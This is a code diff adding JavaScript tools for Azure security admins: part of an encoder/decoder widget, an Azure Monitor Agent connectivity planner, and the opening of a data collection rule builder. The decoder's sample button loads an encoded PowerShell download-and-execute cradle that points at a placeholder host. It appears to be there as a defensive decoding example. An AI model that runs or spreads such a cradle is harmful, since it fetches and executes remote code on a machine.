+      inp.addEventListener('input', run);
+      w.addEventListener('click', e => {
+        const f = e.target.closest('#eFmt button'); if (f) { fmt = f.dataset.f; w.querySelectorAll('#eFmt button').forEach(x => x.setAttribute('aria-pressed', x === f)); run(); }
+        const d = e.target.closest('#eDir button'); if (d) { dir = d.dataset.d; w.querySelectorAll('#eDir button').forEach(x => x.setAttribute('aria-pressed', x === d)); run(); }
+        if (e.target.closest('#eSwap')) { const o = out.value; dir = dir === 'dec' ? 'enc' : 'dec'; w.querySelectorAll('#eDir button').forEach(x => x.setAttribute('aria-pressed', x.dataset.d === dir)); inp.value = o; run(); }
+        if (e.target.closest('#eCopy') && out.value) copy(out.value, 'output');
+        if (e.target.closest('#eSample')) {
+          fmt = 'ps'; dir = 'dec';
+          w.querySelectorAll('#eFmt button').forEach(x => x.setAttribute('aria-pressed', x.dataset.f === 'ps'));
+          w.querySelectorAll('#eDir button').forEach(x => x.setAttribute('aria-pressed', x.dataset.d === 'dec'));
+          inp.value = FORMATS.ps.enc("IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/payload.ps1')"); run();
+        }
+      });
+      inp.value = FORMATS.ps.enc('Get-Process | Sort-Object CPU -Descending | Select-Object -First 5'); run();
+    }
+
+    /* =========================================================
+       AMA connectivity planner
+       Sources: learn.microsoft.com
+         azure-monitor/agents/azure-monitor-agent-network-configuration
+         azure-arc/servers/network-requirements
+         azure-arc/servers/private-link-security
+         azure-monitor/fundamentals/private-link-configure
+         azure-monitor/data-collection/data-collection-endpoint-overview
+       ========================================================= */
+    function renderAma(w) {
+      const st = {
+        machine: 'arc', os: 'linux', net: 'private', arcPls: true, ampls: true, proxy: false, metrics: false, dceSource: false,
+        region: 'qatarcentral', wsRegion: 'qatarcentral', ws: '', dce: '', dceIngest: '', proxyUrl: 'http://proxy.contoso.local:8080'
+      };
+      const norm = s => (s || '').toLowerCase().replace(/\s+/g, '');
+      const segBtns = (key, opts) => `<span class="seg" data-key="${key}">${opts.map(([v, l]) => `<button data-v="${v}" aria-pressed="${st[key] === v}">${l}</button>`).join('')}</span>`;
+
+      w.innerHTML = `
+        <div class="w-head"><div><h2>AMA connectivity planner</h2><p>Pick the machine type and network path. Get the exact endpoints, service tags, private DNS zones, setup steps and a test script for that combination: Azure VM or Arc, public, proxy, AMPLS, Arc Private Link Scope and DCEs.</p></div></div>
+        <div class="w-sec">
+          <div class="plan-grid">
+            <div class="field"><label>Machine</label>${segBtns('machine', [['azure', 'Azure VM'], ['arc', 'Arc-enabled server']])}</div>
+            <div class="field"><label>OS</label>${segBtns('os', [['windows', 'Windows'], ['linux', 'Linux']])}</div>
+            <div class="field"><label>Network path</label>${segBtns('net', [['public', 'Public endpoints'], ['private', 'Private link']])}</div>
+            <div class="field"><label>Options</label>
+              <div class="chks">
+                <label class="chk" data-show="arc-private"><input type="checkbox" data-c="arcPls" ${st.arcPls ? 'checked' : ''}/> Arc Private Link Scope</label>
+                <label class="chk" data-show="arc-private"><input type="checkbox" data-c="ampls" ${st.ampls ? 'checked' : ''}/> Azure Monitor Private Link Scope</label>
+                <label class="chk"><input type="checkbox" data-c="proxy" ${st.proxy ? 'checked' : ''}/> Outbound goes through a proxy</label>
+                <label class="chk" data-show="public"><input type="checkbox" data-c="dceSource" ${st.dceSource ? 'checked' : ''}/> A DCR uses a DCE (e.g. Windows Firewall logs)</label>
+                <label class="chk"><input type="checkbox" data-c="metrics" ${st.metrics ? 'checked' : ''}/> Send custom metrics</label>
+              </div>
+            </div>
+          </div>
+          <div class="plan-grid inputs">
+            <div class="field"><label for="aR">Machine region</label><input class="inp" id="aR" data-t="region" value="${esc(st.region)}" spellcheck="false" placeholder="qatarcentral"/></div>
+            <div class="field"><label for="aWR">Workspace region</label><input class="inp" id="aWR" data-t="wsRegion" value="${esc(st.wsRegion)}" spellcheck="false" placeholder="qatarcentral"/></div>
+            <div class="field"><label for="aWs">Workspace ID</label><input class="inp" id="aWs" data-t="ws" value="" spellcheck="false" placeholder="00000000-0000-0000-0000-000000000000"/></div>
+            <div class="field" data-show="dce"><label for="aD">DCE host prefix <span class="cm">(config, machine region)</span></label><input class="inp" id="aD" data-t="dce" spellcheck="false" placeholder="dce-soc-a1b2"/></div>
+            <div class="field" data-show="dce-cross"><label for="aDI">Ingestion DCE prefix <span class="cm">(workspace region)</span></label><input class="inp" id="aDI" data-t="dceIngest" spellcheck="false" placeholder="dce-soc-ingest-c3d4"/></div>
+            <div class="field" data-show="proxy"><label for="aP">Proxy URL</label><input class="inp" id="aP" data-t="proxyUrl" value="${esc(st.proxyUrl)}" spellcheck="false"/></div>
+          </div>
+        </div>
+        <div id="amaOut"></div>`;
+
+      const out = $('#amaOut', w);
+
+      function plan() {
+        const isArc = st.machine === 'arc', isWin = st.os === 'windows';
+        const r = norm(st.region) || '<region>', wr = norm(st.wsRegion) || r;
+        const ws = st.ws.trim() || '<workspace-id>';
+        const usePls = isArc && st.net === 'private' && st.arcPls;
+        const useAmpls = st.net === 'private' && (isArc ? st.ampls : true);
+        const needDce = useAmpls || st.dceSource;
+        const cross = wr !== r;
+        const dceCfg = (st.dce.trim() || '<dce>') + `.${r}-1`;
+        const dceIng = cross ? (st.dceIngest.trim() || '<ingest-dce>') + `.${wr}-1` : dceCfg;
+        const E = [];
+        const add = (host, purpose, when, route, group, test) => { if (!E.some(e => e.host === host)) E.push({ host, purpose, when, route, group, test: test === undefined ? (host.includes('*') ? null : host) : test }); };
+        const pub = st.proxy ? 'proxy' : 'public';
+
+        /* Azure Monitor Agent */
+        if (!useAmpls) {
+          add('global.handler.control.monitor.azure.com', 'AMA control service', 'Always', pub, 'Azure Monitor Agent');
+          add(`${r}.handler.control.monitor.azure.com`, 'Fetch DCRs for this machine', 'Always', pub, 'Azure Monitor Agent');
+          add(`${ws}.ods.opinsights.azure.com`, 'Log ingestion into the workspace', 'Always', pub, 'Azure Monitor Agent');
+          add('global.prod.microsoftmetrics.com', 'Metrics service', 'Always', pub, 'Azure Monitor Agent');
+          if (st.dceSource) add(`${dceIng}.ingest.monitor.azure.com`, 'Log ingestion through the DCE', 'DCRs that use a DCE', pub, 'Azure Monitor Agent');
+        } else {
+          add(`${dceCfg}.handler.control.monitor.azure.com`, 'Fetch DCRs (configuration DCE)', 'Always', 'private', 'Azure Monitor Agent');
+          add(`${dceIng}.ingest.monitor.azure.com`, 'Log ingestion through the DCE', 'Always', 'private', 'Azure Monitor Agent');
+          add(`${ws}.ods.opinsights.azure.com`, 'Workspace ingestion (ODS)', 'Always', 'private', 'Azure Monitor Agent');
+          add(`${ws}.oms.opinsights.azure.com`, 'Workspace agent endpoint (OMS)', 'Always', 'private', 'Azure Monitor Agent');
+        }
+        if (st.metrics) {
+          add('management.azure.com', 'Custom metrics (and Arc resource changes)', 'Custom metrics', 'public', 'Azure Monitor Agent');
+          add(`${r}.monitoring.azure.com`, 'Custom metrics ingestion', 'Custom metrics', 'public', 'Azure Monitor Agent');
+        }
+
+        /* Arc Connected Machine agent */
+        if (isArc) {
+          add(isWin ? 'download.microsoft.com' : 'packages.microsoft.com', 'Agent install package', 'Install and updates', pub, 'Arc agent');
+          add('login.microsoftonline.com', 'Entra ID token endpoint (global)', 'Always', pub, 'Arc agent');
+          add('*.login.microsoft.com', 'Entra ID regional token endpoints', 'Always', pub, 'Arc agent', `${r}.login.microsoft.com`);
+          add('pas.windows.net', 'Entra ID', 'Always', pub, 'Arc agent');
+          if (!E.some(e => e.host === 'management.azure.com')) add('management.azure.com', 'Create / delete the Arc resource', 'Connect and disconnect', pub, 'Arc agent');
+          add('*.his.arc.azure.com', 'Metadata and hybrid identity', 'Always', usePls ? 'private' : pub, 'Arc agent', 'gbl.his.arc.azure.com');
+          add('*.guestconfiguration.azure.com', 'Extension management and guest configuration', 'Always', usePls ? 'private' : pub, 'Arc agent', 'agentserviceapi.guestconfiguration.azure.com');
+          add('guestnotificationservice.azure.com', 'Notification service', 'Always', pub, 'Arc agent');
+          add('*.guestnotificationservice.azure.com', 'Notification service (regional)', 'Always', pub, 'Arc agent', null);
+          add('azgn*.servicebus.windows.net', 'Notification service', 'Always', pub, 'Arc agent', null);
+        }
+
+        /* service tags */
+        const tags = [];
+        if (isArc) {
+          tags.push(['AzureActiveDirectory', 'Entra ID sign-in', true], ['AzureResourceManager', 'Resource Manager', true], ['AzureArcInfrastructure', 'Arc services (allow the full tag, not just one region)', !usePls],
+            ['AzureTrafficManager', 'Arc endpoint routing', !usePls], ['Storage', 'Extension downloads', true], ['AzureFrontDoor.Frontend', 'Required for Arc since April 2026', true]);
+          if (!useAmpls) tags.push(['AzureMonitor', 'AMA control and ingestion', true]);
+        } else {
+          tags.push(['AzureResourceManager', 'Required for AMA', true]);
+          if (!useAmpls) tags.push(['AzureMonitor', 'AMA control and ingestion', true]);
+          else tags.push(['VirtualNetwork', 'Reach the AMPLS private endpoint (NSG outbound)', true]);
+        }
+
+        /* DNS */
+        const zones = [];
+        if (useAmpls) zones.push(
+          ['privatelink.monitor.azure.com', 'Global endpoints and the DCE handler.control / ingest hosts'],
+          ['privatelink.oms.opinsights.azure.com', 'Workspace-specific agent endpoints'],
+          ['privatelink.ods.opinsights.azure.com', 'Workspace ingestion (ODS)'],
+          ['privatelink.agentsvc.azure-automation.net', 'Agent service automation'],
+          ['privatelink.blob.core.windows.net', 'Solution packs storage account']);
+        if (usePls) zones.push(['privatelink.his.arc.azure.com', 'Arc hybrid identity'], ['privatelink.guestconfiguration.azure.com', 'Arc extensions and guest configuration']);
+        const fwd = zones.map(z => z[0].replace('privatelink.', ''));
+
+        /* steps */
+        const steps = [];
+        if (isArc) {
+          if (st.proxy) steps.push(`Set the Arc agent proxy <b>before</b> you connect: <code>azcmagent config set proxy.url</code>.${usePls ? ' Add a bypass so Arc traffic goes straight to the private endpoint.' : ''}`);
+          if (usePls) steps.push('Create an <b>Arc Private Link Scope</b> in the <b>same region as the Arc servers</b>. Add a private endpoint (sub-resource <code>hybridcompute</code>) in a VNet reachable over VPN or ExpressRoute.');
+          steps.push(usePls ? 'Onboard with a portal-generated script, choosing <b>Private endpoint</b> as the connectivity method. For servers already onboarded, associate them with the scope (up to 15 min to take effect).' : 'Onboard the server with <code>azcmagent connect</code> (a portal-generated script or a service principal at scale).');
+        }
+        if (useAmpls) {
+          steps.push('Create an <b>Azure Monitor Private Link Scope</b>. Start with ingestion access mode <b>Open</b> and switch to <b>PrivateOnly</b> after validation.');
+          steps.push('Add the <b>Log Analytics workspace</b> to the AMPLS.');
+          steps.push(cross ? `Create a <b>configuration DCE in ${esc(r)}</b> (the machine's region) and an <b>ingestion DCE in ${esc(wr)}</b> (the workspace's region). Add both to the AMPLS.`
+            : `Create a <b>DCE in ${esc(r)}</b> and add it to the AMPLS.`);
+          steps.push(`Create the AMPLS <b>private endpoint</b> (sub-resource <code>azuremonitor</code>)${isArc ? ' in the VNet your on-prem network reaches' : ' in the hub VNet, or the VM\'s VNet if there is no hub'}. The subnet needs at least 11 free IPs.`);
+          steps.push('Associate the machine with the configuration DCE (the association name must be <code>configurationAccessEndpoint</code>) and make every DCR use a DCE.');
+        } else if (st.dceSource) {
+          steps.push('Create a DCE in the workspace region and set it on the DCRs whose data source needs one.');
+        }
+        if (zones.length) steps.push(isArc ? 'Create the private DNS zones, link them to the VNet, then add <b>conditional forwarders</b> on your on-prem DNS to an Azure DNS Private Resolver inbound endpoint (or a DNS forwarder in Azure).'
+          : 'Create the private DNS zones and link them to the VNet. If the VNet uses custom DNS, forward these zones to Azure DNS (168.63.129.16).');
+        if (st.proxy) steps.push('Set the proxy on the <b>AMA extension</b> (see commands). Disable HTTPS inspection for every AMA endpoint.');
+        steps.push('Install AMA and associate the DCRs (from Sentinel data connectors, a DCR, or Azure Policy).');
+        steps.push('Run the test script on the machine. Every host should resolve and connect' + (zones.length ? ', and private hosts should resolve to <b>private IPs</b>.' : '.'));
+        if (useAmpls) steps.push('Lock it down: set the AMPLS ingestion mode to <b>PrivateOnly</b>, and disable public network access on the workspace (ingestion) and the DCEs.');
+
+        /* commands */
+        const cmds = [];
+        if (isArc && st.proxy) cmds.push(['Arc agent proxy', `azcmagent config set proxy.url "${st.proxyUrl}"${usePls ? '\n# send Arc service traffic to the private endpoint, not the proxy\nazcmagent config set proxy.bypass "Arc"' : ''}`]);
+        if (st.proxy) {
+          const ext = isWin ? 'AzureMonitorWindowsAgent' : 'AzureMonitorLinuxAgent';
+          cmds.push([`AMA proxy (${isArc ? 'Arc' : 'Azure VM'}, ${isWin ? 'Windows' : 'Linux'})`, isArc
+            ? `$settings = @{"proxy" = @{mode = "application"; address = "${st.proxyUrl}"; auth = "false"}}\nNew-AzConnectedMachineExtension -Name ${ext} -ExtensionType ${ext} -Publisher Microsoft.Azure.Monitor \`\n  -ResourceGroupName <rg> -MachineName <arc-server> -Location ${r} -Setting $settings`
+            : `$settingsString = '{"proxy":{"mode":"application","address":"${st.proxyUrl}","auth":"false"}}'\nSet-AzVMExtension -ExtensionName ${ext} -ExtensionType ${ext} -Publisher Microsoft.Azure.Monitor \`\n  -ResourceGroupName <rg> -VMName <vm> -Location ${r} -SettingString $settingsString`]);
+        }
+        if (useAmpls) {
+          cmds.push(['Add workspace and DCE to the AMPLS', `az monitor private-link-scope scoped-resource create \\\n  --resource-group <rg> --scope-name <ampls> --name law-link \\\n  --linked-resource <workspace-resource-id>\n\naz monitor private-link-scope scoped-resource create \\\n  --resource-group <rg> --scope-name <ampls> --name dce-link \\\n  --linked-resource <dce-resource-id>`]);
+          cmds.push(['Associate the machine with the configuration DCE', `az monitor data-collection rule association create \\\n  --name configurationAccessEndpoint \\\n  --resource "<${isArc ? 'arc-machine' : 'vm'}-resource-id>" \\\n  --endpoint-id "<config-dce-resource-id>"`]);
+        }
+        if (usePls) cmds.push(['Associate an existing Arc server with the Arc Private Link Scope', `scopeId=$(az connectedmachine private-link-scope show \\\n  --resource-group <rg> --scope-name <arc-pls> --query id -o tsv)\n\naz connectedmachine update --resource-group <rg> --name <arc-server> \\\n  --private-link-scope-resource-id "$scopeId"`]);
+        if (isArc) cmds.push(['Arc built-in connectivity check', `azcmagent check --location ${r}${usePls ? ' --enable-pls-check' : ''}`]);
+
+        /* test script */
+        const hosts = E.filter(e => e.test && !e.test.includes('<')).map(e => [e.test, e.route === 'private']);
+        const placeholderHosts = E.filter(e => e.test && e.test.includes('<')).length;
+        const script = isWin
+          ? `# Run in PowerShell on the machine\n$hosts = @(\n${hosts.map(([h, p]) => `  @{ Host = '${h}'; Private = $${p} }`).join(",\n")}\n)\n$results = foreach ($t in $hosts) {\n  $ip  = (Resolve-DnsName $t.Host -Type A -ErrorAction SilentlyContinue | Where-Object IPAddress | Select-Object -First 1).IPAddress\n  $tcp = (Test-NetConnection $t.Host -Port 443 -WarningAction SilentlyContinue).TcpTestSucceeded\n  $isPriv = $ip -match '^(10\\.|172\\.(1[6-9]|2\\d|3[01])\\.|192\\.168\\.)'\n  $dns = if (-not $ip) { 'NO DNS' } elseif ($t.Private -and -not $isPriv) { 'PUBLIC IP (expected private)' } else { 'ok' }\n  [pscustomobject]@{ Host = $t.Host; IP = $ip; DNS = $dns; Tcp443 = $tcp }\n}\n$results | Format-Table -AutoSize`
+          : `#!/usr/bin/env bash\n# Run on the machine\nwhile read -r host want; do\n  ip=$(getent ahostsv4 "$host" | awk 'NR==1{print $1}')\n  if timeout 5 bash -c "</dev/tcp/$host/443" 2>/dev/null; then tcp=OK; else tcp=FAIL; fi\n  dns=ok\n  [ -z "$ip" ] && dns="NO DNS"\n  if [ "$want" = private ] && [ -n "$ip" ] && ! echo "$ip" | grep -Eq '^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)'; then dns="PUBLIC IP (expected private)"; fi\n  printf "%-62s %-16s %-30s %s\\n" "$host" "\${ip:--}" "$dns" "$tcp"\ndone <<'EOF'\n${hosts.map(([h, p]) => `${h} ${p ? 'private' : 'public'}`).join('\n')}\nEOF`;
+
+        /* gotchas */
+        const g = ['Disable <b>HTTPS / TLS inspection</b> for every AMA endpoint. It is the most common cause of AMA failing silently behind a firewall.'];
+        if (useAmpls) g.push('With AMPLS, <b>all DCRs must use DCEs</b>, and every DCE has to be added to the AMPLS. The configuration DCE must be in the machine\'s region; the ingestion DCE in the workspace\'s region.',
+          '<b>One AMPLS per DNS.</b> A second AMPLS on a network that shares DNS overwrites the same records and breaks the first. In hub-and-spoke, put it on the hub.',
+          'Once AMPLS DNS is in place, <b>every AMA on that DNS needs a DCE</b>, including machines you didn\'t plan to make private.');
+        if (useAmpls && isArc) g.push('Forwarding <code>blob.core.windows.net</code> to Azure DNS affects <b>every storage account</b> your on-prem clients resolve. If a storage account has no private endpoint, it still resolves publicly, but test it before you change production DNS.');
+        if (usePls) g.push('Arc Private Link Scope only covers <b>Arc</b>. AMA still needs its own <b>AMPLS</b> for private ingestion.',
+          '<b>Entra ID and Resource Manager stay public</b> even with Arc Private Link. Keep them allowed (or add a Resource Management private link for ARM).',
+          'The Arc server and Arc Private Link Scope must be in the <b>same region</b>, and one VNet can only have <b>one</b> Arc Private Link Scope.');
+        if (isArc) g.push('The Arc agent does <b>not</b> support a Log Analytics gateway as its proxy (AMA does). Use a normal HTTP proxy or Arc gateway.');
+        if (isArc && !usePls) g.push('Allow the <b>full AzureArcInfrastructure</b> tag. The regional ranges don\'t include the global components.');
+        if (!isArc) g.push('Don\'t block <code>168.63.129.16</code>. The Azure VM agent uses it to install and update the AMA extension.');
+        if (st.proxy && !isWin) g.push('Linux AMA only honours the <code>http_proxy</code> / <code>https_proxy</code> environment variables from version 1.24.2.');
+        if (st.metrics) g.push('<b>Custom metrics</b> don\'t support proxies or private link. They always go to the public endpoints listed.');
+        if (needDce) g.push('DCE hosts include a numeric suffix like <code>.' + esc(r) + '-1</code>. Copy the exact hostname from the DCE overview page; it can differ.');
+        if (placeholderHosts) g.push(`<b>${placeholderHosts}</b> host${placeholderHosts > 1 ? 's are' : ' is'} left out of the test script until you fill in the workspace ID${needDce ? ' and DCE prefix' : ''}.`);
+
+        return { isArc, usePls, useAmpls, needDce, cross, r, wr, E, tags, zones, fwd, steps, cmds, script, g };
+      }
+
+      const routeLbl = { private: 'Private endpoint', public: 'Internet', proxy: 'Via proxy' };
+      const routeCls = { private: 'g', public: 'b', proxy: 'w' };
+
+      function run() {
+        const isArc = st.machine === 'arc';
+        w.querySelectorAll('[data-show]').forEach(el => {
+          const k = el.dataset.show;
+          const show = k === 'arc-private' ? isArc && st.net === 'private'
+            : k === 'public' ? st.net === 'public'
+            : k === 'dce' ? (st.net === 'private' && (!isArc || st.ampls)) || (st.net === 'public' && st.dceSource)
+            : k === 'dce-cross' ? norm(st.wsRegion) !== norm(st.region) && ((st.net === 'private' && (!isArc || st.ampls)) || st.dceSource)
+            : k === 'proxy' ? st.proxy : true;
+          el.style.display = show ? '' : 'none';
+        });
+        const p = plan();
+        const priv = p.E.filter(e => e.route === 'private'), other = p.E.filter(e => e.route !== 'private');
+        const pills = [
+          `<span class="pill b">${p.isArc ? 'Arc-enabled server' : 'Azure VM'} · ${st.os === 'windows' ? 'Windows' : 'Linux'}</span>`,
+          p.useAmpls ? '<span class="pill g">AMPLS</span>' : '',
+          p.usePls ? '<span class="pill g">Arc Private Link Scope</span>' : '',
+          st.proxy ? '<span class="pill w">Proxy</span>' : '',
+          p.needDce ? `<span class="pill ${p.useAmpls ? 'g' : ''}">DCE required${p.cross && p.useAmpls ? ' (2: config + ingestion)' : ''}</span>` : '<span class="pill">No DCE needed</span>',
+          `<span class="pill">${p.E.length} endpoints · ${p.zones.length} DNS zones</span>`
+        ].join('');
+        const listTxt = p.E.map(e => `${e.host}\t443\t${routeLbl[e.route]}\t${e.purpose}`).join('\n');
+        out.innerHTML = `
+          <div class="w-sec">
+            <div class="summary">${pills}</div>
+            <div class="route-split">
+              <div class="route-card ${priv.length ? '' : 'empty'}"><h4><span class="dot-g"></span>Over the private endpoint</h4>${priv.length ? `<ul>${priv.map(e => `<li>${esc(e.purpose)}</li>`).join('')}</ul>` : '<p>Nothing. Switch the network path to Private link to see this.</p>'}</div>
+              <div class="route-card"><h4><span class="dot-${st.proxy ? 'w' : 'b'}"></span>${st.proxy ? 'Through the proxy' : 'Over the internet'}</h4>${other.length ? `<ul>${[...new Set(other.map(e => e.group === 'Arc agent' && /Entra/.test(e.purpose) ? 'Entra ID sign-in' : e.purpose))].map(x => `<li>${esc(x)}</li>`).join('')}</ul>` : '<p>Nothing. All agent traffic stays private.</p>'}</div>
+            </div>
+          </div>
+          <div class="w-sec">
+            <h3><span>Outbound allow-list · TCP 443</span><span class="row-actions"><button class="btn sm" data-copy="${esc(p.E.map(e => e.host).join('\n'))}" data-label="hostnames">Copy hostnames</button><button class="btn sm" data-copy="${esc(listTxt)}" data-label="full allow-list">Copy as table</button></span></h3>
+            <div class="tbl-wrap"><table class="kv"><thead><tr><th>Endpoint</th><th>Route</th><th>Purpose</th><th>When</th></tr></thead><tbody>
+              ${['Azure Monitor Agent', 'Arc agent'].map(gname => {
+                const rows = p.E.filter(e => e.group === gname); if (!rows.length) return '';
+                return `<tr class="grp"><td colspan="4">${gname}</td></tr>` + rows.map(e => `<tr><td class="v"><span ${cp(e.host, e.host)}>${esc(e.host)}</span></td><td><span class="pill ${routeCls[e.route]}">${routeLbl[e.route]}</span></td><td class="d">${esc(e.purpose)}</td><td class="d">${esc(e.when)}</td></tr>`).join('');
+              }).join('')}
+            </tbody></table></div>
+          </div>
+          <div class="w-sec">
+            <h3><span>Service tags${p.isArc ? ' <span style="text-transform:none;letter-spacing:0">(for IP-based on-prem firewalls, use the Service Tags JSON)</span>' : ' (NSG / Azure Firewall)'}</span></h3>
+            <div class="tags-grid">${p.tags.map(([t, d, need]) => `<div class="tagcard ${need ? '' : 'dim'}"><code ${cp(t, t)}>${esc(t)}</code><span>${esc(d)}${need ? '' : ' · not needed when traffic is private'}</span></div>`).join('')}</div>
+          </div>
+          ${p.zones.length ? `<div class="w-sec">
+            <h3><span>Private DNS zones</span><span class="row-actions"><button class="btn sm" data-copy="${esc(p.zones.map(z => z[0]).join('\n'))}" data-label="DNS zones">Copy zones</button>${p.isArc ? `<button class="btn sm" data-copy="${esc(p.fwd.join('\n'))}" data-label="forwarder zones">Copy forwarder zones</button>` : ''}</span></h3>
+            <table class="kv"><tbody>${p.zones.map(([z, d]) => `<tr><td class="v"><span ${cp(z, z)}>${esc(z)}</span></td><td class="d">${esc(d)}</td></tr>`).join('')}</tbody></table>
+            ${p.isArc ? `<div class="info" style="margin-top:12px"><span><b>On-prem DNS:</b> create conditional forwarders for <code>${p.fwd.map(esc).join('</code>, <code>')}</code> pointing to your Azure DNS Private Resolver inbound endpoint. For a handful of servers, a hosts file works for testing.</span></div>` : ''}
+          </div>` : ''}
+          <div class="w-sec"><h3>Setup steps</h3><ol class="olist">${p.steps.map(s => `<li><span>${s}</span></li>`).join('')}</ol></div>
+          ${p.cmds.length ? `<div class="w-sec"><h3>Commands</h3>${p.cmds.map(([t, c]) => `<div class="cmd-block"><div class="cmd-h"><span>${esc(t)}</span><button class="btn sm" data-copy="${esc(c)}" data-label="${esc(t)}">Copy</button></div><pre class="code">${esc(c)}</pre></div>`).join('')}</div>` : ''}
+          <div class="w-sec">
+            <h3><span>Connectivity test · ${st.os === 'windows' ? 'PowerShell' : 'Bash'}</span><span class="row-actions"><button class="btn sm" data-copy="${esc(p.script)}" data-label="test script">Copy script</button></span></h3>
+            <pre class="code" style="max-height:360px">${esc(p.script)}</pre>
+            <p class="hint-line">Checks DNS and TCP 443 for every concrete host above${p.zones.length ? ', and flags private-link hosts that still resolve to a public IP' : ''}. Wildcards are tested with a representative host.</p>
+          </div>
+          <div class="w-sec"><h3>Watch out for</h3><ul class="gotchas">${p.g.map(x => `<li><span>${x}</span></li>`).join('')}</ul>
+            <p class="hint-line">Based on Microsoft Learn: AMA network configuration, Arc network requirements, Arc Private Link, AMPLS and DCE docs. Endpoints change; check the docs before a production change.</p></div>`;
+      }
+
+      w.addEventListener('click', e => {
+        const b = e.target.closest('.seg[data-key] button'); if (!b) return;
+        const seg = b.parentElement; st[seg.dataset.key] = b.dataset.v;
+        seg.querySelectorAll('button').forEach(x => x.setAttribute('aria-pressed', x === b));
+        run();
+      });
+      w.addEventListener('change', e => { const c = e.target.dataset.c; if (c) { st[c] = e.target.checked; run(); } });
+      w.addEventListener('input', e => { const t = e.target.dataset.t; if (t) { st[t] = e.target.value; run(); } });
+      run();
+    }
+
+    /* =========================================================
+       DCR builder
+       Sources: learn.microsoft.com
+         azure-monitor/data-collection/data-collection-rule-samples
+         azure-monitor/data-collection/data-collection-rule-structure
+         azure-monitor/vm/data-collection-windows-events (XPath, 20-expression limit)
+         azure-monitor/agents/data-collection-log-text
+         sentinel/windows-security-event-id-reference (Minimal set)
+         sentinel/connect-cef-syslog-ama, sentinel/cef-syslog-ama-overview
+       ========================================================= */
+    const SEC_MINIMAL = [1102, 4624, 4625, 4657, 4663, 4688, 4700, 4702, 4719, 4720, 4722, 4723, 4724, 4727, 4728, 4732, 4735, 4737, 4739, 4740, 4754, 4755, 4756, 4767, 4799, 4825, 4946, 4948, 4956, 5024, 5033];
+    const FACILITIES = ['auth', 'authpriv', 'cron', 'daemon', 'kern', 'local0', 'local1', 'local2', 'local3', 'local4', 'local5', 'local6', 'local7', 'mail', 'syslog', 'user', 'ftp', 'ntp'];
+    const LEVELS = ['Debug', 'Info', 'Notice', 'Warning', 'Error', 'Critical', 'Alert', 'Emergency'];
+    const WIN_LEVELS = [['1', 'Critical'], ['2', 'Error'], ['3', 'Warning'], ['4', 'Information'], ['5', 'Verbose']];
+    const TIME_FORMATS = ['ISO 8601', 'yyyy-MM-ddTHH:mm:ssk', 'YYYY-MM-DD HH:MM:SS', 'M/D/YYYY HH:MM:SS AM/PM', 'Mon DD, YYYY HH:MM:SS', 'yyMMdd HH:mm:ss', 'ddMMyy HH:mm:ss', 'MMM d HH:mm:ss', 'dd/MMM/yyyy:HH:mm:ss zzz'];
+
+    // "4624, 4720-4740" -> sorted unique ints
+    function parseIds(text) {
+      const out = new Set(), bad = [];
+      (text || '').split(/[\s,;]+/).filter(Boolean).forEach(t => {
+        const m = t.match(/^(\d+)(?:-(\d+))?$/);
+        if (!m) return bad.push(t);
+        const a = +m[1], b = m[2] ? +m[2] : a;
+        if (b < a || b - a > 5000) return bad.push(t);
+        for (let i = a; i <= b; i++) out.add(i);
+      });
+      return { ids: [...out].sort((x, y) => x - y), bad };
+    }
+    // ids -> XPath expressions, compressing runs of 3+ into a range (cost 2)
+    function idExprs(ids) {
+      const ex = []; let i = 0;
+      while (i < ids.length) {
+        let j = i; while (j + 1 < ids.length && ids[j + 1] === ids[j] + 1) j++;
+        if (j - i >= 2) { ex.push({ s: `(EventID >= ${ids[i]} and EventID <= ${ids[j]})`, cost: 2 }); i = j + 1; }
+        else { for (let k = i; k <= j; k++) ex.push({ s: `EventID=${ids[k]}`, cost: 1 }); i = j + 1; }
+      }
+      return ex;
+    }
+    // channel + ids (+ optional level clause) -> XPath queries, each within the 20-expression DCR limit
+    function xpaths(channel, ids, levelClause) {
+      if (!ids.length) return [`${channel}!*${levelClause ? `[System[${levelClause}]]` : ''}`];
+      const budget = 20 - (levelClause ? (levelClause.match(/Level=/g) || []).length : 0);
+      const chunks = []; let cur = [], used = 0;
+      idExprs(ids).forEach(e => { if (used + e.cost > budget && cur.length) { chunks.push(cur); cur = []; used = 0; } cur.push(e.s); used += e.cost; });
+      if (cur.length) chunks.push(cur);
+      return chunks.map(c => `${channel}!*[System[${levelClause ? levelClause + ' and ' : ''}(${c.join(' or ')})]]`);
+    }
+    const levelClauseOf = lv => lv.length ? '(' + lv.flatMap(l => l === '4' ? ['Level=4', 'Level=0'] : [`Level=${l}`]).join(' or ') + ')' : '';
+
+    function renderDcr(w) {
+      const st = {
+        name: 'dcr-soc-windows-linux', location: 'qatarcentral', ws: '', dce: '',
+        sec: { on: true, preset: 'minimal', ids: '4624, 4625, 4688, 4720-4740, 1102', applocker: true, transform: 'source' },
+        evt: { on: false, system: ['1', '2', '3'], application: ['1', '2', '3'], custom: 'Microsoft-Windows-Sysmon/Operational', customIds: '', customOn: false, transform: 'source' },
+        fwd: { on: false, transform: 'source' },
+        sys: { on: false, fac: ['auth', 'authpriv', 'cron', 'daemon', 'kern', 'syslog'], min: 'Warning', filterCef: true, transform: 'source' },
+        cef: { on: true, fac: ['local4'], min: 'Info', transform: 'source' },
+        txt: { on: false, os: 'linux', pattern: '/var/log/myapp/*.log', table: 'MyApp', time: 'ISO 8601', delim: '', cols: 'Time:datetime, Level:string, Message:string' }
+      };
+      const chkList = (path, items, sel) => items.map(([v, l]) => `<label class="chk sm"><input type="checkbox" data-arr="${path}" value="${v}" ${sel.includes(v) ? 'checked' : ''}/> ${l}</label>`).join('');
+      const facOpts = (path, sel) => chkList(path, FACILITIES.map(f => [f, f]), sel);
+      const lvlSel = (path, val) => `<select data-v="${path}">${LEVELS.map(l => `<option ${l === val ? 'selected' : ''}>${l}</option>`).join('')}</select>`;
+      const card = (key, title, sub, table, body) => `
+        <div class="src-card ${st[key].on ? 'on' : ''}" data-card="${key}">
+          <label class="src-head"><input type="checkbox" data-on="${key}" ${st[key].on ? 'checked' : ''}/><span><b>${title}</b><small>${sub}</small></span><code>${table}</code></label>
+          <div class="src-body">${body}</div>
+        </div>`;
+      const tf = key => `<div class="field"><label>Transformation (KQL, optional)</label><input class="inp" data-v="${key}.transform" value="${esc(st[key].transform)}" spellcheck="false"/></div>`;
+
+      w.innerHTML = `
